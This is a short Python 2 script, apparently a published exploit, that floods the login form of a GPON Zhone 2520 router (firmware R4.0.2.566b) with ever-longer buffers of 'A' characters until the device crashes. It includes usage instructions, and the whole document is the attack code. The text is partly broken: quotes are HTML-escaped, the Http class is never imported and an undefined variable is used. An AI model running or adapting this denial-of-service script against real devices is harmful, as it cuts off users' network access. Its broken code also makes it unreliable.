from urllib import urlencode
import sys,time
#main function
if __name__ == "__main__":
        if(len(sys.argv) != 2):
                print &#039;*********************************************************************************&#039;
                print &#039; GPON Zhone R4.0.2.566b D.O.S.&#039;
                print &#039; Tested on&#039;
                print &#039;          GPON Zhone 2520&#039;
                print &#039;          Hardware: 0040-48-02&#039;
                print &#039;          Software: R4.0.2.566b&#039;
                print &#039;                                 &#039;
                print &#039; Usage : python&#039;, sys.argv[0] + &#039; <ip>&#039;
                print &#039; Ex :    python&#039;,sys.argv[0] + &#039; 192.168.15.1&#039;
                print &#039; Author : Kaczinski lramirez@websec.mx &#039;
                print &#039; URL : http://www.websec.mx/advisories&#039;
                print &#039;*********************************************************************************&#039;
                sys.exit()
 
HOST = sys.argv[1]
LIMIT = 100000
COUNT = 1
SIZE = 10
BUFFER = &#039;&#039;
 
while len(BUFFER) < LIMIT:
        BUFFER = &#039;\x41&#039; * COUNT
        print "[+] Sending evil buffer with length:", len(BUFFER)
        h = Http()
        h.follow_redirects = True
        data = dict(XWebPageName=buffer, oldpassword=BUFFER, password="", password2="test", passwdtip="test")
        try:
                resp, content = h.request("http://" + HOST + "/GponForm/LoginForm", "POST", urlencode(data))
        except:
                print "[+] GPON should be down, is not responding..."
                sys.exit()
        COUNT = COUNT * SIZE
 
print "[-] GPON not vulnerable"

